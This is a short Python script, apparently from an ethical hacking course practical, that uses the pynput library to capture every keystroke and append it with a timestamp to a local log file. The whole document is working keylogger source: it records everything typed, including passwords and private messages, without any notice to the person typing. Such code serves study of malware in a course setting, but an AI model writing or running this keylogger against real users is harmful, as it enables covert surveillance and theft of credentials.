from pynput.keyboard import Key, Listener
import logging
import os

dir_path = r"D:\cs\sem6\P5 - Ethical Hacking\prac keylogger"
log_file = os.path.join(dir_path, "keylog.txt")

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
